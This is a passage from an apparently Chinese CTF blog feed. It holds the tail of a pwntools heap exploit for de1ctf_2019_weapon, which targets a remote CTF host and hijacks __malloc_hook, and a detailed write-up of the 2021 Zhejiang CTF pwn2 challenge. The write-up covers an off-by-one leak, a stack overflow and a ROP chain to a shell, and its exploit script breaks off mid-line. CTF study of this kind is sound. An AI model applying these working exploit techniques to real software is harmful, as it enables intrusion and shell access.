class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span>(<span class="params">x,file_name</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x:</span><br><span class="line">        p=process(file_name)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc/libc-2.23-64.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29410</span>)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc/libc-2.23-buu64.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> ELF(file_name),libc,p</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,index,name</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;weapon: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;name:&#x27;</span>,name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;idx :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,payload</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;idx: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;content:&#x27;</span>,payload)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    elf,libc,p=conn(<span class="number">0</span>,<span class="string">&#x27;./de1ctf_2019_weapon&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x58</span>,<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>+p64(<span class="number">0x61</span>))</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x18</span>,<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x58</span>,<span class="number">3</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    edit(<span class="number">0</span>,p8(<span class="number">0x50</span>))</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x58</span>,<span class="number">4</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x58</span>,<span class="number">5</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x91</span>))</span><br><span class="line"></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">1</span>,p16(<span class="number">0xa5dd</span>))</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">5</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x71</span>))</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">6</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">7</span>,<span class="string">b&#x27;\0&#x27;</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    libc_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>,timeout=<span class="number">0.5</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x3c5600</span></span><br><span class="line">    success(<span class="string">&#x27;libc_addr:&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#one=[0x45226,0x4527a,0xf03a4,0xf1247]</span></span><br><span class="line">    one=[<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">1</span>,p64(libc_addr+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x23</span>))</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">8</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xb</span>+p64(libc_addr+one[<span class="number">1</span>])+p64(libc_addr+libc.sym[<span class="string">&#x27;realloc&#x27;</span>]+<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;weapon: &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pwn()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            p.close()</span><br></pre></td></tr></table></figure><p>结果</p><p><img src="/2021/11/07/de1ctf_2019_weapon/2.png" alt="2"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2021浙江省赛pwn2复盘</title>
      <link href="/2021/11/06/zjctf2021%20pwn2/"/>
      <url>/2021/11/06/zjctf2021%20pwn2/</url>
      
        <content type="html"><![CDATA[<p>这题在比赛是没有做出来的，属于赛后复盘，但是感觉这题不该在比赛做不出来，因为赛后花了两小时就出了。</p><span id="more"></span><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>首先checksec发现保护全开了，ida打开，主函数是一个while 1 循环且没有return，如果要栈溢出得在其它函数。首先ida分析有部分不到位，有一个很明显的值赋值指针，然后后面还有对指针之后的元素读取一个int型变量，很明显栈布局是这样的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">char buf[]</span><br><span class="line"></span><br><span class="line">char *ptr</span><br><span class="line">int size</span><br></pre></td></tr></table></figure><p>然后我们去混淆一下，去除那个指针刚好是31个int_64，把它改变一下就是char buf[248]，如下更方便分析(isnan函数是因为去除了alarm方便调试)</p><p><img src="/2021/11/06/zjctf2021%20pwn2/1.png" alt="1"></p><p>可以很明显的看到中间有两层检测，但是一旦不满足最外层那个检测那么就会循环输出<code>too easy</code>，因此我们看看这个判断是什么，这个判断的意思就是我们的指针只有在&gt;=缓冲区地址或者&lt;=rbp-0x220才允许执行下面的流程。因为栈是向低地址增长，所以第一个判断就是ptr要落在buf或者buf下面(栈底方向)。如果我们有机会修改ptr，那确实可以通过ptr任意写，而我们之前分析的是不能通过main函数溢出，所以往后面写没多大用处，那么我们看看第二个条件。意思大概就是如果不在buf下面，那么在上面也要离buf有一定距离，这个距离是rbp-0x220，然后buf最顶端距离rbp是0x120，所以指针不能落在(buf-0x100,buf)范围内因为判过有等号，所以判不过自然是开区间。</p><p>size只能0x100以内，观察类型发现判断的时候类型为unsigned，不能负溢。那么进入myputs，myread和mywrite查看。</p><p>myputs：单个字符输出，遇到\0停止输出。</p><p>mywrite：固定逐字节输出那么长的字节序列。</p><p>myread：也是逐字节读入那么长的序列，并且while  read(1)表示必须要读那么多的字节，但是注意他循环是从0，然后对size判断的时候加了等号，这就意味着能够多读入一个字节，存在off by one。</p><p>buf距离ptr刚好0x100字节，如果溢出一个字节那么可以溢出一个较大字节，使得等会通过这个指针输出的时候能够输出后面的栈内容。</p><h2 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h2><p>我们通过之前分析的内构造以下内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pop_rdi_ret=<span class="number">0x0000000000026b72</span><span class="comment">#libc中寻找的</span></span><br><span class="line">read(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>+<span class="string">b&#x27;\xff&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="/2021/11/06/zjctf2021%20pwn2/2.png" alt="2"></p><p>可以看到后面输出了很多东西，但是因为栈不存在内存页对齐的说法，所以最后一个字节改大之后能输出多少东西全凭运气。我们可以在输入之后用gdb attach去查看此时栈的情况看看能泄露什么东西。由于没有去符号表，因此为了方便定位代码我们直接在后面加上b mywrite。</p><p><img src="/2021/11/06/zjctf2021%20pwn2/3.png" alt="3"></p><p>圈出来的是指针末尾被改了的情况，然后三个箭头是可以泄露的东西，分别能泄露栈，libc和程序的加载基址。但是如果buf本身所在位置的最低字节就是e0,f0之类的那可能泄露不了这么多东西，所以这一点也是看脸的。那么我们如何接收泄露的数据呢？</p><p>首先我们第一个泄露的地址应该是ptr，但是ptr被我们改过，我们并具体泄露出这个buf在哪个位置。所以这个我们不考虑，我们接受后面的栈地址，计算一下泄露地址和buf的偏移得到buf地址。后面的没啥好说的，就是开了pie之后程序加载基址不知道具体会在哪，不过据我观察它大部分高字节是55，有时候是56，所以我们就以55判断吧。但是为了调试方便我们选择先关闭aslr调试，具体细节就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#echo 0 &gt;/proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><p>关闭之后开了aslr的程序固定加载在0x555555554000上面，所以我们选择以四个字节的55来判断是否有没有泄露到程序加载基址，等到打远程的时候调回来就行了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)</span><br><span class="line">stack_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x218</span><span class="comment">#buf_addr-8</span></span><br><span class="line"><span class="comment">#因为一开始指向劫持这个忽略了条件不允许，这里到后来也没改，问题不大，之后在引用这个值的时候+8就完事了。</span></span><br><span class="line">success(<span class="string">&#x27;stack_addr:&#x27;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">libc_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x270b3</span><span class="comment">#libc_base</span></span><br><span class="line">success(<span class="string">&#x27;libc_addr:&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">code_base=u64(p.recvuntil(<span class="string">b&#x27;\x55&#x27;</span>*<span class="number">4</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;code_base:&#x27;</span>+<span class="built_in">hex</span>(code_base))</span><br><span class="line"></span><br><span class="line">sys=libc_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh=libc_addr+libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line">pop_rdi_ret+=libc_addr<span class="comment">#用的是libc的gadget，用本身的gadget加上code_base即可</span></span><br></pre></td></tr></table></figure><p>这里我关了aslr的调试结果</p><p><img src="/2021/11/06/zjctf2021%20pwn2/4.png" alt="4"></p><h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>泄露了这三个基址之后，我们就要考虑在哪里劫持程序流了。got表因为开了保护无法劫持，我们只能劫持函数，唯一具有输入功能的就是my_read函数，所以肯定是在这里溢出。我们之前讨论过我们的ptr能劫持的位置是有限制的。</p><p>如果我们把指针刚好劫持在buf-0x100，然后读入0x100字节的数据能否溢出呢？答案当然是可以的，因为buf是main函数的栈顶了，再上去就是其它函数的栈帧了，就算这0x100字节不能碰到buf，那碰到上面函数的返回地址还是可以的。这便是这题的巧妙之处了，这里我想了很久。但是要注意，我们是逐字节输入的，并不是一口气输入完的，所以里面的一些变量不能破坏。这里具体要自己调试了，它中间好像有把循环截止条件的那个数，也就是第三个参数放到栈上，因为我覆盖过去直接就无了，循环直接退出了。还有一个就是jmp 的时候也有用到栈上的地址跳转，因为我使用e覆盖的，然后我那个指令直接就跳到了0xXXXXX65的地方，然后就crash了，所以这个地方大概率是要放上正确的跳转地址的。因为是逐字节填充，所以这里是肯定劫持不了程序的，我们只能尽量不破坏它程序的执行，我们的最终目标其实也就填上那8个字节其它是什么其实无所谓，只要能成功劫持那八个字节，我们就能控制程序流。</p><h3 id="布置rop链"><a href="#布置rop链" class="headerlink" title="布置rop链"></a>布置rop链</h3><p>这题可以执行system(“/bin/sh”)，因此我们先构造rop链。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=...+p64(pop_rdi_ret)+p64(sh)+p64(system_addr)</span><br></pre></td></tr></table></figure><p>pop_rdi_ret的gadget可以使用elf的，也可以用库的，这个看自己心情，我因为一开始没有选择接受程序基址就选择了libc的gadget。因为我们只能劫持八个字节，那么执行了pop_rdi_ret之后程序ret到哪里了呢，我们先画出当时整个栈结构。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">i</span><br><span class="line">main&#x27;s rbp</span><br><span class="line">ret_addr</span><br><span class="line">buf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ptr</span><br><span class="line">size</span><br><span class="line">canary</span><br><span class="line">libc_start_main&#x27;s rbp</span><br><span class="line">ret_addr</span><br></pre></td></tr></table></figure><p>可以看出来，返回地址后面紧跟着的就是buf，buf我们一开始是可控的，但是一开始我们并不知道system和/bin/sh的地址，因此这里我们需要选择把指针恢复填上p64(sh)+p64(system_addr)，这样当劫持my_read函数的时候就会形成rop链。那么接下来要如何把指针劫持回去呢，因为我们用的是\xff字节去填充了最低位，现在我们如果写，将不会从buf的地方开始而是会从(buf_addr|0xff)，这也是一开始选取\xff字节的目的，因为它八个都是1，在最后计算的时候直接或上去就可以了，如果选取其它的可能就要进行一些复杂的运算，比如\xfe字节你可能就得这么写。</p><p>(buf_addr&amp;0xffffffffff00)|0xfe</p><p>这个应该都能理解吧，因为我们是覆盖操作，但是如果覆盖位数都为1就可以直接或上去，不用再&amp;清除低位字节。</p><p>而我们的目标地址在buf_addr+0x100，所以只需要算这个偏移就行了。这偏移也是很好算的，我们从buf_addr|0xff开始写，然后终点是buf_addr+0x100，两个一减就能算出填充字节的位数了，然后再加上buf_addr指针给他写回去。好了之后呢，就是开头放上p64(sh)+p64(system_addr)然后依然要溢出ff字节，不然只能溢出一个字节不足以能肯定改变指针到我们想的地方。所以重复一开始的操作溢出为0xff，然后再劫持到buf_addr-0x100的地方去。</p><p>改回指针并且重写再次溢出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">offset=stack_addr+<span class="number">8</span>+<span class="number">0x100</span>-((stack_addr+<span class="number">8</span>)|<span class="number">0xff</span>)</span><br><span class="line">read(offset+<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>*offset+p64(stack_addr+<span class="number">8</span>))<span class="comment">#再次注意一下，我的stack_addr是buf_addr-8</span></span><br><span class="line"></span><br><span class="line">read(<span class="number">0x100</span>,p64(sh)+p64(pop_rdi_ret+<span class="number">1</span>)+p64(sys)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe8</span>+<span class="string">b&#x27;\xff&#x27;</span>)<span class="comment">#这里需要加个ret平衡栈，后面注意到了就知道在这里加一个就行</span></span><br><span class="line">read(offset+<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>*offset+p64(stack_addr-<span class="number">0xf8</span>))<span class="comment">#就跟改回来是一样的，截图并未执行到这里</span></span><br></pre></td></tr></table></figure><p><img src="/2021/11/06/zjctf2021%20pwn2/5.png" alt="5"></p><h3 id="劫持my-read"><a href="#劫持my-read" class="headerlink" title="劫持my_read"></a>劫持my_read</h3><p>一开始可能想的会有点简单，直接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read(<span class="number">0xff</span>,<span class="string">b&#x27;e&#x27;</span>*<span class="number">0xf8</span>+p64(pop_rdi_ret))<span class="comment">#也是因为这个填充字符选的到位，导致能快速找出错误，所以如果程序退出异常但还能继续执行不妨改一下填充字符哦</span></span><br></pre></td></tr></table></figure><p>但是会发现程序直接死了，这里就来复原一下我复盘时出的问题，先用这个最简单的payload试试看问题出在哪里。</p><p><img src="/2021/11/06/zjctf2021%20pwn2/6.png" alt="6"></p><p>会发现这个指令非常奇奇怪怪，而且rip此时最低那个字节的值是65刚好就是e的ASCII码，再disass一下发现这个函数根本没有指到这个位置上的指令，可以很清楚的知道，这条指令是被分割了，那么我们回溯栈看看，发现我们覆盖了什么导致这个问题。可以看到次时i的值就是0xb8，那么我们就调试到i=0xb7的时候，观察接下来要覆盖的值是什么。</p><p><img src="/2021/11/06/zjctf2021%20pwn2/7.png" alt="7"></p><p>可以发现接下来要覆盖的字节应该就是两个箭头所指的地方，而右边这里刚好有一个在程序的code段的地址，猜测刚刚应该是覆盖了这里的最低位导致的问题。并且我们刚刚的rip错误指向就是0x555555555365，刚好就是那个地址低字节覆盖了0x65字节导致的问题，我们先来观察一下这个地址在哪里。</p><p><img src="/2021/11/06/zjctf2021%20pwn2/8.png" alt="8"></p><p>可以发现刚好在myread中有这么一个地址，那么看到它在read函数下面应该能想到，这个是在调用read的时候保存的返回地址，读完之后改变了这个返回地址导致了出现这个错误。因为在这里调用read返回地址肯定知道就是在函数的这个位置，那么它在code_base上偏移是固定的，算出偏移之后这个地方的8个字节就固定填写这个不要改变了。此时我们的payload变成</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=(<span class="string">b&#x27;e&#x27;</span>*<span class="number">0xb8</span>+p64(code_base+<span class="number">0x130a</span>)).ljust(<span class="number">0xf8</span>,<span class="string">b&#x27;e&#x27;</span>)+p64(pop_rdi_ret)</span><br><span class="line">read(<span class="number">0xff</span>,payload)</span><br></pre></td></tr></table></figure><p>但是发现执行着突然退出了，而当时i的值还是0xc8</p><p><img src="/2021/11/06/zjctf2021%20pwn2/9.png" alt="9"></p><p>到底是为什么呢，应该能稍微猜到一点，因为可以看到rsp的那个地方已经填充好了8个e接下来就要向0xff那边填充了，0xff是循环条件的一个值，猜测是因为这个值被覆盖了导致循环提前结束了，那么在长度到0xc8的时候，这个位置应该填上一个p64(0xff)才能过去，然后后面又有一个地址，不难发现它是我们buf_addr的地址，那么这个地址也不应该被覆盖，而应该写回去。同理，下面的i作为循环变量也不应该被覆盖，这个应当能提前预测到的。</p><p>至于这个位置应该写多少呢，可以想想如果i=0的时候写自己应该写多少呢？答案当然是还是写个0才能保证写进去并且i+1。那么这个位置在哪呢，应该不难推测出开始覆盖ret_addr的时候，它的值应当i=0xf8，覆盖之前的rbp时，i=0xf0，那么再往前推，这个值应该是i=0xe8，所以这个地方给上\xe8然后后面一律填0即可。可以看到这次栈溢出注意的东西也是非常多的，可以说这题目出的也是相当好的。</p><p>最后就没什么讲究了，覆盖上ret_addr为pop_rdi_ret的gadget就能直接getshell。下面是完整payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;e&#x27;</span>*<span class="number">0xb8</span>+p64(code_base+<span class="number">0x130a</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0xc8</span>,<span class="string">b&#x27;e&#x27;</span>)</span><br><span class="line">payload+=p64(<span class="number">0xff</span>)+p64(stack_addr-<span class="number">0xf8</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0xe8</span>,<span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read(<span class="number">0xff</span>,payload+<span class="string">b&#x27;\xe8&#x27;</span>+<span class="string">b&#x27;\0&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;f&#x27;</span>*<span class="number">8</span>+p64(pop_rdi_ret))</span><br></pre></td></tr></table></figure><p><img src="/2021/11/06/zjctf2021%20pwn2/10.png" alt="10"></p><p>能稳定getsehll，但是前提是aslr关了，aslr关了调试其实是非常舒服的，因为面对复杂的情况有时候可能不能getshell，就比如前面举过的例子，程序基址的最高字节非\x55，buf_addr的最低字节过大，目前已知就这两种情况会导致无法正常getshell。</p><p>这里还需要注意一点，因为关了aslr，我们前面的接受泄露的地址是用的p.recvuntil(b’\x55’*4)[-6:]，关了之后要把后面那个4去掉，这里因为识别单个字节，不排除会识别错误，这个随机加载谁说的清楚呢，这都是小问题。下面给出我开了aslr的运行结果。</p><p><img src="/2021/11/06/zjctf2021%20pwn2/11.png" alt="11"></p><p>如果希望能一把梭，那么可以把攻击的部分作为一个函数，然后主函数while 1 try except这样玩，但是要注意给开头四个recvuntil都加上一个参数timeout=0.5，这样它接收不到这个字节超过0.5秒就会停止接收，后面就会产生报错，报错之后自己会重新运行一遍。注意下面给的exp并没有加上这个，但是加的方法已经告诉你了。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">size,payload</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;size&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;sentence&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./easy_stack&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./easy_stack&#x27;</span>)</span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000026b72</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b myread&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">read(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>+<span class="string">b&#x27;\xff&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)</span><br><span class="line">stack_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x218</span></span><br><span class="line">success(<span class="string">&#x27;stack_addr:&#x27;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">libc_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x270b3</span></span><br><span class="line">success(<span class="string">&#x27;libc_addr:&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">code_base=u64(p.recvuntil(<span class="string">b&#x27;\x55&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;code_base:&#x27;</span>+<span class="built_in">hex</span>(code_base))</span><br><span class="line"></span><br><span class="line">sys=libc_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh=libc_addr+libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line">pop_rdi_ret+=libc_addr</span><br><span class="line"></span><br><span class="line">offset=stack_addr+<span class="number">8</span>+<span class="number">0x100</span>-((stack_addr+<span class="number">8</span>)|<span class="number">0xff</span>)</span><br><span class="line"><span class="comment">#success(&#x27;a&#x27;*offset)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">read(offset+<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>*offset+p64(stack_addr+<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">read(<span class="number">0x100</span>,p64(sh)+p64(pop_rdi_ret+<span class="number">1</span>)+p64(sys)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe8</span>+<span class="string">b&#x27;\xff&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read(offset+<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>*offset+p64(stack_addr-<span class="number">0xf8</span>))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;e&#x27;</span>*<span class="number">0xb8</span>+p64(code_base+<span class="number">0x130a</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0xc8</span>,<span class="string">b&#x27;e&#x27;</span>)</span><br><span class="line">payload+=p64(<span class="number">0xff</span>)+p64(stack_addr-<span class="number">0xf8</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0xe8</span>,<span 